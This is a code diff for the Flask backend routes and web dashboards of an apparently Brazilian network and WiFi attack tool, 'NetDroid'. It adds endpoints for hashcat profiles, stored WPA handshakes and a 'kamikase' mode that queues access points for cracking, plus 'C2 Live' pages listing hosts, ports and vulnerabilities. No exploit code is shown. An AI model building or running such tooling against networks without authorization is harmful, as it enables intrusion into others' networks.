+        @app.route("/api/perfis_hashcat")
+        def api_perfis():
+            return jsonify(HASHCAT_PROFILES)
+
+        @app.route("/api/rescan", methods=["POST", "GET"])
+        def api_rescan():
+            """Re-escaneia redes WiFi e adiciona só APs novos."""
+            if not dash.kami_engine:
+                return jsonify({"erro": "engine não inicializado"}), 400
+            try:
+                resumo = dash.kami_engine.remapear_redes()
+                return jsonify(resumo)
+            except Exception as e:
+                return jsonify({"erro": str(e)}), 500
+
+        @app.route("/api/ap/<bssid>")
+        def api_ap_detalhes(bssid):
+            """Detalhes profundos de um AP: runtime + memória persistente."""
+            if not dash.kami_engine:
+                return jsonify({}), 404
+            ap_runtime = next((a for a in dash.kami_engine.alvos
+                                if a.get("bssid") == bssid), {})
+            ap_memoria = (dash.kami_engine.memoria.obter_ap(bssid)
+                           if dash.kami_engine.memoria else {}) or {}
+            # Mescla: runtime tem dados atuais, memoria tem histórico
+            mesclado = {**ap_memoria, **ap_runtime}
+            mesclado["memoria"] = ap_memoria
+            return jsonify(mesclado)
+
+        @app.route("/api/memoria/stats")
+        def api_memoria_stats():
+            if not dash.kami_engine or not dash.kami_engine.memoria:
+                return jsonify({"total_aps": 0, "com_handshake": 0,
+                                 "quebradas": 0, "handshakes_em_disco": 0})
+            return jsonify(dash.kami_engine.memoria.stats())
+
+        @app.route("/api/memoria/limpar", methods=["POST"])
+        def api_memoria_limpar():
+            if dash.kami_engine and dash.kami_engine.memoria:
+                apagar_hs = flask_request.args.get("handshakes", "0") == "1"
+                dash.kami_engine.memoria.limpar(apagar_handshakes=apagar_hs)
+            return jsonify({"ok": True})
+
+        @sio.on("connect")
+        def on_connect():
+            sio.emit("estado_inicial", dash.estado)
+
+        @sio.on("mover_zona")
+        def on_mover(data):
+            """Drag-and-drop entre zonas (--kamikase)."""
+            if dash.modo != "kamikase" or not dash.kami_engine:
+                return
+            bssid = data.get("bssid")
+            destino = data.get("destino")  # 'verde'|'vermelha'|'azul'
+            perfil = data.get("perfil", "low")
+            wordlist = data.get("wordlist")
+            contextual = data.get("contextual", True)
+            try:
+                dash.kami_engine.mover_para_zona(bssid, destino, perfil=perfil,
+                                                  wordlist=wordlist,
+                                                  contextual=contextual)
+            except Exception as e:
+                dash.ui.warn(f"Erro ao mover {bssid} → {destino}: {e}")
+
+
+# ══════════════════ TEMPLATES HTML ═════════════════════════════
+
+TEMPLATE_GOD = r"""<!doctype html>
+<html lang="pt-BR" class="dark">
+<head>
+<meta charset="utf-8">
+<title>NetDroid · GOD · C2 Live</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --red:#ff003c; --red-deep:#7a001c; --green:#00ff9f; --cyan:#00d4ff;
+    --yellow:#fdee00; --purple:#bc13fe; --orange:#ff9d4d;
+    --bg:#050608; --bg-2:#0a0c12; --bg-card:rgba(10,12,18,0.85);
+    --line:rgba(255,255,255,0.05); --line-hot:rgba(255,0,60,0.25);
+    --text:#e8eaed; --text-2:#9ca3af; --text-dim:#5b6370;
+  }
+  *{ box-sizing:border-box; }
+  body {
+    background:
+      radial-gradient(ellipse 800px 500px at 0% 0%, rgba(255,0,60,0.08), transparent 60%),
+      radial-gradient(ellipse 800px 500px at 100% 100%, rgba(0,212,255,0.04), transparent 60%),
+      var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono','Courier New',monospace;
+    font-size: 13px; letter-spacing: 0.01em;
+    min-height: 100vh; position: relative;
+  }
+  /* CRT scanlines */
+  body::before {
+    content:''; position:fixed; inset:0;
+    background: repeating-linear-gradient(0deg, transparent 0, transparent 2px, rgba(255,255,255,0.018) 2px, rgba(255,255,255,0.018) 3px);
+    pointer-events:none; z-index:1;
+  }
+  /* Vignette */
+  body::after {
+    content:''; position:fixed; inset:0;
+    background: radial-gradient(ellipse at center, transparent 50%, rgba(0,0,0,0.6) 100%);
+    pointer-events:none; z-index:1;
+  }
+  main, header, footer { position: relative; z-index: 2; }
+  /* Cards cyberpunk com brackets nos cantos */
+  .cyber {
+    background: var(--bg-card);
+    border: 1px solid var(--line);
+    backdrop-filter: blur(8px);
+    position: relative;
+    transition: border-color .25s, transform .25s;
+  }
+  .cyber::before, .cyber::after {
+    content:''; position:absolute; width:14px; height:14px;
+    border:1px solid var(--red); pointer-events:none;
+    transition: opacity .25s, border-color .25s;
+    opacity: 0.4;
+  }
+  .cyber::before { top:-1px; left:-1px; border-right:none; border-bottom:none; }
+  .cyber::after  { bottom:-1px; right:-1px; border-left:none; border-top:none; }
+  .cyber:hover { border-color: var(--line-hot); }
+  .cyber:hover::before, .cyber:hover::after { opacity:1; }
+
+  /* Stat tile */
+  .stat {
+    padding: 18px 16px 14px; position: relative; overflow:hidden;
+  }
+  .stat::after {
+    content:''; position:absolute; bottom:0; left:0;
+    height:1px; width:40%;
+    background: linear-gradient(90deg, var(--red), transparent);
+  }
+  .stat-val { font-family:'Orbitron',monospace; font-size:1.9rem; font-weight:800; line-height:1; letter-spacing:-0.01em; font-variant-numeric: tabular-nums; }
+  .stat-lbl { font-size:0.62rem; letter-spacing:0.22em; text-transform:uppercase; color:var(--text-dim); margin-top:10px; }
+  .stat-fase-val { font-size:0.78rem; font-weight:700; line-height:1.25; color:var(--purple); text-shadow: 0 0 10px rgba(188,19,254,0.4); display:-webkit-box; -webkit-line-clamp:3; -webkit-box-orient:vertical; overflow:hidden; }
+
+  /* Logo */
+  .logo {
+    font-family:'Orbitron',monospace; font-weight:900;
+    font-size:1.2rem; letter-spacing:0.2em;
+    color:var(--red); text-shadow: 0 0 10px var(--red), 0 0 28px rgba(255,0,60,0.4);
+    position:relative;
+  }
+  .logo::after {
+    content:''; position:absolute; left:0; right:0; bottom:-4px; height:1px;
+    background: linear-gradient(90deg, transparent, var(--red), transparent);
+  }
+  .tag-mode {
+    font-size:0.62rem; letter-spacing:0.22em; font-weight:700;
+    padding:4px 10px; border:1px solid var(--red); border-radius:999px;
+    background: rgba(255,0,60,0.08); color:var(--red); text-transform:uppercase;
+    animation: glow-pulse 2s ease-in-out infinite;
+  }
+  @keyframes glow-pulse {
+    0%,100% { box-shadow: 0 0 8px rgba(255,0,60,0.3); }
+    50% { box-shadow: 0 0 18px rgba(255,0,60,0.7); }
+  }
+
+  /* LEDs */
+  .led { display:inline-block; width:6px; height:6px; border-radius:50%; margin-right:6px; vertical-align:middle; }
+  .led-on  { background:var(--green); box-shadow: 0 0 6px var(--green); }
+  .led-warn{ background:var(--yellow); box-shadow: 0 0 6px var(--yellow); }
+  .led-off { background:var(--red);   box-shadow: 0 0 8px var(--red); animation: led-blink 1.4s ease-in-out infinite; }
+  @keyframes led-blink { 50% { opacity: 0.3; } }
+
+  /* Section header */
+  h2.sec {
+    font-size:0.7rem; letter-spacing:0.22em; text-transform:uppercase;
+    color:var(--text); font-weight:700;
+    display:flex; align-items:center; gap:10px;
+  }
+  h2.sec::before { content:''; width:14px; height:1px; background:var(--red); }
+
+  /* Host card */
+  .host-card {
+    background: linear-gradient(180deg, rgba(255,255,255,0.015), transparent);
+    border: 1px solid var(--line);
+    transition: all .2s;
+  }
+  .host-card:hover { border-color: var(--line-hot); transform: translateX(2px); }
+  .host-card.gw { border-left: 3px solid var(--red); }
+
+  .pill {
+    display:inline-flex; align-items:center; gap:4px;
+    font-size:0.62rem; letter-spacing:0.08em; font-weight:600;
+    padding:2px 8px; border-radius:3px; border:1px solid currentColor;
+    text-transform:uppercase;
+  }
+
+  /* Severity badges */
+  .sev-critica { background:rgba(255,0,60,0.12); color:#ff5d77; border-color:rgba(255,0,60,0.4); }
+  .sev-alta    { background:rgba(255,140,0,0.12); color:#ff9d4d; border-color:rgba(255,140,0,0.4); }
+  .sev-media   { background:rgba(255,220,0,0.10); color:#ffe05e; border-color:rgba(255,220,0,0.35); }
+  .sev-info    { background:rgba(0,212,255,0.10); color:#5fbcff; border-color:rgba(0,212,255,0.35); }
+  .sev-ok      { background:rgba(0,255,159,0.10); color:#5fff9f; border-color:rgba(0,255,159,0.35); }
+
+  /* Tipo cores */
+  .tipo-roteador     { color:#5fbcff; border-color:rgba(95,188,255,0.4); background:rgba(0,75,140,0.15); }
+  .tipo-camera_ip    { color:#ff5d77; border-color:rgba(255,93,119,0.4); background:rgba(140,0,40,0.15); }
+  .tipo-windows_pc   { color:#9ad0ff; border-color:rgba(154,208,255,0.3); background:rgba(28,42,58,0.4); }
+  .tipo-linux_servidor { color:#5fff9f; border-color:rgba(95,255,159,0.3); background:rgba(6,62,26,0.4); }
+  .tipo-mobile       { color:#ff9af0; border-color:rgba(255,154,240,0.3); background:rgba(58,6,62,0.4); }
+  .tipo-impressora   { color:#ffe05e; border-color:rgba(255,224,94,0.3); background:rgba(58,50,6,0.4); }
+  .tipo-nas          { color:#5fffe0; border-color:rgba(95,255,224,0.3); background:rgba(6,62,58,0.4); }
+  .tipo-voip         { color:#c89aff; border-color:rgba(200,154,255,0.3); background:rgba(42,6,62,0.4); }
+  .tipo-iot_generico { color:#ffb35e; border-color:rgba(255,179,94,0.3); background:rgba(62,42,6,0.4); }
+  .tipo-desconhecido { color:#888; border-color:rgba(136,136,136,0.3); background:rgba(20,20,20,0.4); }
+
+  /* Animations */
+  .fadein { animation: fadein .35s ease-out; }
+  @keyframes fadein { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:translateY(0)} }
+  .scan-bar { position:absolute; left:0; right:0; top:0; height:1px; background:linear-gradient(90deg,transparent,var(--red),transparent); animation: scan 4s linear infinite; }
+  @keyframes scan { 0%{top:0}100%{top:100%} }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width:6px; height:6px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: rgba(255,0,60,0.25); border-radius:3px; }
+  ::-webkit-scrollbar-thumb:hover { background: rgba(255,0,60,0.5); }
+
+  /* Glow utilities */
+  .text-glow-red   { text-shadow: 0 0 8px var(--red); }
+  .text-glow-green { text-shadow: 0 0 8px var(--green); }
+  .text-glow-cyan  { text-shadow: 0 0 8px var(--cyan); }
+</style>
+</head>
+<body>
+
+<header class="cyber border-0 border-b px-6 py-3 flex items-center justify-between sticky top-0 z-30" style="background: rgba(5,6,8,0.92); border-color: var(--line-hot)">
+  <div class="flex items-center gap-5">
+    <div class="logo">NETDROID</div>
+    <div class="tag-mode">⚡ GOD · C2 LIVE</div>
+    <div class="text-xs text-gray-500" id="timestamp">--:--:--</div>
+  </div>
+  <div class="flex items-center gap-4 text-xs">
+    <span class="flex items-center"><span class="led led-on"></span><span class="text-gray-400 uppercase tracking-wider">online</span></span>
+    <span class="text-gray-600">v1.4.0</span>
+  </div>
+</header>
+
+<main class="p-4 grid grid-cols-12 gap-3">
+
+  <section class="col-span-12 grid grid-cols-2 md:grid-cols-4 gap-3">
+    <div class="cyber stat fadein">
+      <div class="stat-val" style="color:var(--green)" id="stat-hosts">0</div>
+      <div class="stat-lbl">▸ Hosts</div>
+    </div>
+    <div class="cyber stat fadein">
+      <div class="stat-val text-yellow-400" id="stat-portas">0</div>
+      <div class="stat-lbl">▸ Portas Abertas</div>
+    </div>
+    <div class="cyber stat fadein">
+      <div class="stat-val" style="color:var(--red)" id="stat-vulns">0</div>
+      <div class="stat-lbl">▸ Vulnerabilidades</div>
+    </div>
+    <div class="cyber stat fadein" style="overflow:hidden">
+      <div class="stat-fase-val" id="stat-fase">aguardando…</div>
+      <div class="stat-lbl">▸ Fase Atual</div>
+    </div>
+  </section>
+
+  <section class="col-span-12 lg:col-span-8 cyber p-4 relative" style="overflow:hidden">
+    <div class="scan-bar"></div>
+    <div class="flex items-center justify-between mb-4">
+      <h2 class="sec">⚔ Inventário de Hosts</h2>
+      <span class="text-xs text-gray-500" id="host-count-label">0 mapeados</span>
+    </div>
+    <div id="host-list" class="space-y-1.5 max-h-[600px] overflow-y-auto pr-2"></div>
+  </section>
+
+  <aside class="col-span-12 lg:col-span-4 space-y-3">
+    <div class="cyber p-4">
+      <h2 class="sec mb-4">⚙ Distribuição por Tipo</h2>
+      <canvas id="chart-types" height="200"></canvas>
+    </div>
+    <div class="cyber p-4">
+      <h2 class="sec mb-4">⚠ Severidade de Vulns</h2>
+      <canvas id="chart-vulns" height="200"></canvas>
+    </div>
+  </aside>
+
+  <section class="col-span-12 cyber p-4">
+    <h2 class="sec mb-4" style="color:#ff5d77">⚠ Vulnerabilidades Detectadas</h2>
+    <div id="vuln-list" class="space-y-1 max-h-[260px] overflow-y-auto"></div>
+  </section>
+
+  <section class="col-span-12 cyber p-4">
+    <h2 class="sec mb-3">▸ Log em Tempo Real</h2>
+    <pre id="logfeed" class="text-xs leading-5 max-h-[200px] overflow-y-auto" style="color:var(--text-2)"></pre>
+  </section>
+
+</main>
+
+<footer class="text-center text-xs py-4 mt-2" style="color:var(--text-dim); border-top:1px solid var(--line)">
+  NetDroid v1.4.0 · GOD C2 Live · localhost only · uso autorizado apenas
+</footer>
+
+<script>
+const sock = io({transports:["websocket","polling"]});
+let hosts = {}; let vulns = []; let chartTypes, chartVulns;
+
+const TIPO_COLORS = ["#ff003c","#5fbcff","#5fff9f","#ffe05e","#bc13fe","#ff9d4d","#5fffe0","#ff9af0","#888"];
+const SEV_COLORS = { critica:"#ff003c", alta:"#ff8a3d", media:"#fdee00", info:"#5fbcff" };
+
+function pill(text, klass){return `<span class="pill ${klass}">${text}</span>`}
+
+function renderHosts(){
+  const el = document.getElementById("host-list");
+  const arr = Object.values(hosts).sort((a,b)=>(b.is_gateway?1:0)-(a.is_gateway?1:0));
+  el.innerHTML = arr.map(h=>{
+    const score = h.score||0;
+    const ledClass = score>=60?"led-off":score>=30?"led-warn":"led-on";
+    const riskColor = score>=60?"#ff5d77":score>=30?"#ffe05e":"#5fff9f";
+    const tipoCl = "tipo-" + (h.device_type||"desconhecido");
+    return `
+    <div class="host-card rounded p-2.5 fadein cursor-pointer ${h.is_gateway?'gw':''}" onclick="toggle('${h.ip}')">
+      <div class="flex items-center justify-between">
+        <div class="flex items-center gap-3 min-w-0">
+          <span class="led ${ledClass}"></span>
+          <span class="font-bold tabular-nums" style="color:var(--text)">${h.ip}</span>
+          ${h.is_gateway?pill("GATEWAY","sev-critica"):""}
+          <span class="text-xs text-gray-500 truncate">${h.hostname||"—"}</span>
+        </div>
+        <div class="flex items-center gap-2 shrink-0">
+          ${pill(h.device_type||"?",tipoCl)}
+          <span class="text-xs font-bold tabular-nums" style="color:${riskColor}">${score}</span>
+        </div>
+      </div>
+      <div id="det-${h.ip.replace(/\./g,"-")}" class="hidden mt-3 pt-3 text-xs space-y-1" style="border-top:1px dashed var(--line)">
+        <div class="grid grid-cols-2 gap-2">
+          <div><span class="text-gray-500">MAC:</span> <span class="text-gray-300 tabular-nums">${h.mac||"N/A"}</span></div>
+          <div><span class="text-gray-500">Vendor:</span> <span class="text-gray-300">${h.vendor||"?"}</span></div>
+          <div><span class="text-gray-500">OS:</span> <span class="text-gray-300">${h.os||"?"}</span></div>
+          <div><span class="text-gray-500">Latência:</span> <span class="text-gray-300 tabular-nums">${h.latency_ms||0}ms</span></div>
+        </div>
+        ${h.ports&&h.ports.length?`<div class="mt-2"><span class="text-gray-500">Portas:</span> <span class="tabular-nums" style="color:var(--yellow)">${h.ports.slice(0,15).join(", ")}</span></div>`:""}
+        ${h.fontes?`<div><span class="text-gray-500">Fontes:</span> <span style="color:var(--cyan)">${h.fontes.join(" · ")}</span></div>`:""}
+        ${h.vulns&&h.vulns.length?`<div class="mt-2 space-y-1">${h.vulns.map(v=>`<div class="pill sev-${v.severidade} block !text-left !text-xs !px-2 !py-1.5 !normal-case !tracking-normal">[${v.severidade.toUpperCase()}] ${v.dica_cve}</div>`).join("")}</div>`:""}
+      </div>
+    </div>`;
+  }).join("");
+  document.getElementById("host-count-label").textContent = `${arr.length} mapeados`;
+  document.getElementById("stat-hosts").textContent = arr.length;
+  document.getElementById("stat-portas").textContent = arr.reduce((a,h)=>a+(h.ports||[]).length,0);
+}
+function toggle(ip){const el = document.getElementById("det-"+ip.replace(/\./g,"-")); if(el) el.classList.toggle("hidden");}
+
+function renderVulns(){
+  const el = document.getElementById("vuln-list");
+  el.innerHTML = vulns.slice(-50).reverse().map(v=>`
+    <div class="flex items-center gap-2 fadein text-xs py-1">
+      <span class="pill sev-${v.severidade}">${(v.severidade||"info").toUpperCase()}</span>
+      <span class="text-gray-300 tabular-nums">${v.ip}:${v.porta||"?"}</span>
+      <span class="text-gray-500 truncate">${v.dica_cve||""}</span>
+    </div>
+  `).join("");
+  document.getElementById("stat-vulns").textContent = vulns.length;
+  updateChartVulns();
+}
+
+function updateChartTypes(){
+  const counts = {};
+  Object.values(hosts).forEach(h=>{const t=h.device_type||"desconhecido"; counts[t]=(counts[t]||0)+1;});
+  const labels = Object.keys(counts), data = Object.values(counts);
+  const cfg = {
+    type:"doughnut",
+    data:{labels,datasets:[{data,backgroundColor:TIPO_COLORS,borderColor:"#0a0c12",borderWidth:2,hoverOffset:8}]},
+    options:{
+      responsive:true, cutout:"68%",
+      plugins:{
+        legend:{position:"bottom",labels:{color:"#9ca3af",font:{size:10,family:"JetBrains Mono"},boxWidth:10,padding:12}},
+        tooltip:{titleFont:{family:"JetBrains Mono"},bodyFont:{family:"JetBrains Mono"}}
+      }
+    }
+  };
+  if(!chartTypes){ chartTypes = new Chart(document.getElementById("chart-types"),cfg); }
+  else { chartTypes.data.labels=labels; chartTypes.data.datasets[0].data=data; chartTypes.update(); }
+}
+function updateChartVulns(){
+  const counts = {critica:0,alta:0,media:0,info:0};
+  vulns.forEach(v=>{counts[v.severidade||"info"]=(counts[v.severidade||"info"]||0)+1;});
+  const total = Object.values(counts).reduce((a,b)=>a+b,0);
+  const data = total === 0 ? [1] : [counts.critica,counts.alta,counts.media,counts.info];
+  const labels = total === 0 ? ["sem vulns"] : ["Crítica","Alta","Média","Info"];
+  const colors = total === 0 ? ["#1a1a1a"] : [SEV_COLORS.critica,SEV_COLORS.alta,SEV_COLORS.media,SEV_COLORS.info];
+  const cfg = {
+    type:"doughnut",
+    data:{labels,datasets:[{data,backgroundColor:colors,borderColor:"#0a0c12",borderWidth:2,hoverOffset:8}]},
+    options:{responsive:true, cutout:"68%", plugins:{legend:{position:"bottom",labels:{color:"#9ca3af",font:{size:10,family:"JetBrains Mono"},boxWidth:10,padding:10}}}}
+  };
+  if(!chartVulns){ chartVulns = new Chart(document.getElementById("chart-vulns"),cfg); }
+  else { chartVulns.data.labels=labels; chartVulns.data.datasets[0].data=data; chartVulns.data.datasets[0].backgroundColor=colors; chartVulns.update(); }
+}
+
+function log(msg, tipo){
+  const el = document.getElementById("logfeed");
+  const cor = {info:"#5fbcff",ok:"#5fff9f",warn:"#ffe05e",err:"#ff5d77"}[tipo]||"#9ca3af";
+  const t = new Date().toLocaleTimeString();
+  el.innerHTML = `<span style="color:${cor}">[${t}]</span> ${msg}\n` + el.innerHTML;
+}
+setInterval(()=>{document.getElementById("timestamp").textContent = new Date().toLocaleTimeString();},1000);
+
+sock.on("estado_inicial",s=>{
+  (s.hosts||[]).forEach(h=>hosts[h.ip]=h);
+  vulns = s.vulns||[];
+  if(s.fase) document.getElementById("stat-fase").textContent = s.fase;
+  renderHosts(); renderVulns(); updateChartTypes();
+});
+sock.on("host_found",h=>{hosts[h.ip]=h;renderHosts();updateChartTypes();log(`<span style="color:#5fff9f">▸</span> host <span style="color:#fff">${h.ip}</span> <span style="color:#888">(${h.device_type||"?"})</span>`,"ok");});
+sock.on("host_update",h=>{Object.assign(hosts[h.ip]||(hosts[h.ip]={}),h);renderHosts();updateChartTypes();});
+sock.on("vuln_found",v=>{vulns.push(v);renderVulns();log(`<span style="color:#ff5d77">⚠</span> vuln <span style="color:#fff">${v.ip}:${v.porta}</span> <span class="pill sev-${v.severidade}">${(v.severidade||'').toUpperCase()}</span>`,v.severidade==="critica"?"err":"warn");});
+sock.on("fase",f=>{document.getElementById("stat-fase").textContent=f.nome;log(`<span style="color:#bc13fe">▶</span> ${f.nome}`,"info");});
+sock.on("log",d=>log(d.msg,d.tipo||"info"));
+</script>
+</body></html>"""
+
+
+TEMPLATE_KAMIKASE = r"""<!doctype html>
+<html lang="pt-BR" class="dark">
+<head>
+<meta charset="utf-8">
+<title>NetDroid · KAMIKASE · C2 Live</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/sortablejs@1.15.2/Sortable.min.js"></script>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700;800&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --red:#ff003c; --red-deep:#7a001c; --green:#00ff9f; --cyan:#00d4ff;
+    --yellow:#fdee00; --purple:#bc13fe; --orange:#ff9d4d;
+    --bg:#050608; --bg-2:#0a0c12; --bg-card:rgba(10,12,18,0.85);
+    --line:rgba(255,255,255,0.05); --line-hot:rgba(255,0,60,0.25);
+    --text:#e8eaed; --text-2:#9ca3af; --text-dim:#5b6370;
+  }
+  *{ box-sizing:border-box; }
+  body {
+    background:
+      radial-gradient(ellipse 800px 500px at 0% 0%, rgba(255,0,60,0.08), transparent 60%),
+      radial-gradient(ellipse 800px 500px at 100% 100%, rgba(0,212,255,0.04), transparent 60%),
+      var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono','Courier New',monospace;
+    font-size: 13px; letter-spacing: 0.01em;
+    min-height: 100vh; position: relative;
+  }
+  body::before {
+    content:''; position:fixed; inset:0;
+    background: repeating-linear-gradient(0deg, transparent 0, transparent 2px, rgba(255,255,255,0.018) 2px, rgba(255,255,255,0.018) 3px);
+    pointer-events:none; z-index:1;
+  }
+  body::after {
+    content:''; position:fixed; inset:0;
+    background: radial-gradient(ellipse at center, transparent 50%, rgba(0,0,0,0.6) 100%);
+    pointer-events:none; z-index:1;
+  }
+  main, header, footer, #bulk-toolbar, #modal, #modal-detalhes, #toast { position: relative; z-index: 2; }
+
+  /* Cards cyberpunk com brackets nos cantos */
+  .cyber {
+    background: var(--bg-card);
+    border: 1px solid var(--line);
+    backdrop-filter: blur(8px);
+    position: relative;
+    transition: border-color .25s;
+  }
+  .cyber::before, .cyber::after {
+    content:''; position:absolute; width:14px; height:14px;
+    border:1px solid var(--red); pointer-events:none;
+    transition: opacity .25s; opacity: 0.4;
+  }
+  .cyber::before { top:-1px; left:-1px; border-right:none; border-bottom:none; }
+  .cyber::after  { bottom:-1px; right:-1px; border-left:none; border-top:none; }
+  .cyber:hover { border-color: var(--line-hot); }
+  .cyber:hover::before, .cyber:hover::after { opacity:1; }
+
+  /* Zonas */
+  .zone-green { border-left: 3px solid var(--green); }
+  .zone-red   { border-left: 3px solid var(--red); }
+  .zone-blue  { border-left: 3px solid var(--cyan); }
+  .zone-green::before, .zone-green::after { border-color: var(--green); }
+  .zone-red::before, .zone-red::after { border-color: var(--red); }
+  .zone-blue::before, .zone-blue::after { border-color: var(--cyan); }
+
+  /* Logo */
+  .logo {
+    font-family:'Orbitron',monospace; font-weight:900;
+    font-size:1.2rem; letter-spacing:0.2em;
+    color:var(--red); text-shadow: 0 0 10px var(--red), 0 0 28px rgba(255,0,60,0.4);
+    position:relative;
+  }
+  .logo::after {
+    content:''; position:absolute; left:0; right:0; bottom:-4px; height:1px;
+    background: linear-gradient(90deg, transparent, var(--red), transparent);
+  }
+  .tag-mode {
+    font-size:0.62rem; letter-spacing:0.22em; font-weight:700;
+    padding:4px 10px; border:1px solid var(--red); border-radius:999px;
+    background: rgba(255,0,60,0.08); color:var(--red); text-transform:uppercase;
+    animation: glow-pulse 2s ease-in-out infinite;
+  }
+  @keyframes glow-pulse {
+    0%,100% { box-shadow: 0 0 8px rgba(255,0,60,0.3); }
+    50% { box-shadow: 0 0 18px rgba(255,0,60,0.7); }
+  }
+
+  /* AP card */
+  .ap-card {
+    background: linear-gradient(180deg, rgba(255,255,255,0.018), transparent);
+    border: 1px solid var(--line);
+    transition: all .25s;
+    cursor: grab;
+    position: relative;
+  }
+  .ap-card:active { cursor: grabbing; }
+  .ap-card:hover { transform: translateY(-1px); border-color: var(--line-hot); }
+  .ap-card.selected { outline: 1px solid var(--yellow); outline-offset: -1px; box-shadow: 0 0 12px rgba(253,238,0,0.25); }
+
+  .pulse-red { animation: pulse-r 1.4s ease-in-out infinite; }
+  @keyframes pulse-r { 0%,100%{box-shadow:0 0 6px rgba(255,0,60,0.5)} 50%{box-shadow:0 0 24px rgba(255,0,60,0.95)} }
+  .pulse-blue { animation: pulse-b 2s ease-in-out infinite; }
+  @keyframes pulse-b { 0%,100%{box-shadow:0 0 6px rgba(0,212,255,0.4)} 50%{box-shadow:0 0 22px rgba(0,212,255,0.85)} }
+
+  @keyframes morph-to-red {
+    0%   { background:rgba(0,255,159,0.10); border-color:rgba(0,255,159,0.4); transform:scale(1); }
+    25%  { background:rgba(255,200,0,0.16); border-color:rgba(255,160,0,0.6); transform:scale(1.02); }
+    60%  { background:rgba(255,80,0,0.20);  border-color:rgba(255,80,0,0.7);  transform:scale(0.99); }
+    100% { background:rgba(255,0,60,0.14);  border-color:rgba(255,0,60,0.7);  transform:scale(1); }
+  }
+  .dying { animation: morph-to-red 3s ease-out forwards; }
+
+  @keyframes morph-to-blue {
+    0%   { background:rgba(0,255,159,0.10); }
+    100% { background:rgba(0,212,255,0.12); }
+  }
+  .crystallizing { animation: morph-to-blue 1.5s ease-out forwards; }
+
+  .fadein { animation: fadein .35s ease-out; }
+  @keyframes fadein { from{opacity:0;transform:translateY(6px)} to{opacity:1;transform:translateY(0)} }
+  .blink { animation: blink 1s steps(2) infinite; }
+  @keyframes blink { 50%{opacity:0.3} }
+
+  /* LEDs */
+  .led { display:inline-block; width:6px; height:6px; border-radius:50%; margin-right:6px; vertical-align:middle; }
+  .led-on  { background:var(--green); box-shadow: 0 0 6px var(--green); }
+  .led-warn{ background:var(--yellow); box-shadow: 0 0 6px var(--yellow); }
+  .led-off { background:var(--red);   box-shadow: 0 0 8px var(--red); animation: led-blink 1.4s ease-in-out infinite; }
+  @keyframes led-blink { 50% { opacity: 0.3; } }
+
+  /* Section header */
+  h2.sec {
+    font-size:0.7rem; letter-spacing:0.22em; text-transform:uppercase;
+    color:var(--text); font-weight:700;
+    display:flex; align-items:center; gap:10px;
+  }
+  h2.sec::before { content:''; width:14px; height:1px; background:var(--red); }
+
+  /* Stat */
+  .stat { padding: 18px 16px 14px; position: relative; overflow:hidden; }
+  .stat::after { content:''; position:absolute; bottom:0; left:0; height:1px; width:40%; background: linear-gradient(90deg, var(--red), transparent); }
+  .stat-val { font-family:'Orbitron',monospace; font-size:1.9rem; font-weight:800; line-height:1; letter-spacing:-0.01em; font-variant-numeric: tabular-nums; }
+  .stat-lbl { font-size:0.62rem; letter-spacing:0.22em; text-transform:uppercase; color:var(--text-dim); margin-top:10px; }
+
+  /* Pills */
+  .pill {
+    display:inline-flex; align-items:center; gap:4px;
+    font-size:0.62rem; letter-spacing:0.08em; font-weight:600;
+    padding:2px 8px; border-radius:3px; border:1px solid currentColor;
+    text-transform:uppercase;
+  }
+  .sev-critica { background:rgba(255,0,60,0.12); color:#ff5d77; border-color:rgba(255,0,60,0.4); }
+  .sev-alta    { background:rgba(255,140,0,0.12); color:#ff9d4d; border-color:rgba(255,140,0,0.4); }
+  .sev-media   { background:rgba(255,220,0,0.10); color:#ffe05e; border-color:rgba(255,220,0,0.35); }
+  .sev-info    { background:rgba(0,212,255,0.10); color:#5fbcff; border-color:rgba(0,212,255,0.35); }
+  .sev-ok      { background:rgba(0,255,159,0.10); color:#5fff9f; border-color:rgba(0,255,159,0.35); }
+  /* Compatibilidade com badge-sev-* (legado) */
+  .badge-sev-critica { background:rgba(255,0,60,0.12); color:#ff5d77; border:1px solid rgba(255,0,60,0.4); }
+  .badge-sev-alta    { background:rgba(255,140,0,0.12); color:#ff9d4d; border:1px solid rgba(255,140,0,0.4); }
+  .badge-sev-media   { background:rgba(255,220,0,0.10); color:#ffe05e; border:1px solid rgba(255,220,0,0.35); }
+  .badge-sev-info    { background:rgba(0,212,255,0.10); color:#5fbcff; border:1px solid rgba(0,212,255,0.35); }
+
+  /* Progress bar */
+  .progress-bar { background:linear-gradient(90deg,var(--cyan),var(--purple)); height:5px; transition: width .4s ease; }
+
+  /* Botões zona */
+  .btn-zone {
+    font-size:0.6rem; letter-spacing:0.14em; padding:4px 10px; border-radius:4px;
+    text-transform:uppercase; font-weight:700; cursor:pointer; transition: all .2s;
+  }
+  .btn-zone:hover { transform: translateY(-1px); }
+  .btn-red   { background: rgba(255,0,60,0.10); border:1px solid rgba(255,0,60,0.35); color:#ff7090; }
+  .btn-red:hover   { background: rgba(255,0,60,0.22); box-shadow: 0 0 12px rgba(255,0,60,0.4); }
+  .btn-blue  { background: rgba(0,212,255,0.10); border:1px solid rgba(0,212,255,0.35); color:#5fbcff; }
+  .btn-blue:hover  { background: rgba(0,212,255,0.22); box-shadow: 0 0 12px rgba(0,212,255,0.4); }
+  .btn-green { background: rgba(0,255,159,0.10); border:1px solid rgba(0,255,159,0.35); color:#5fff9f; }
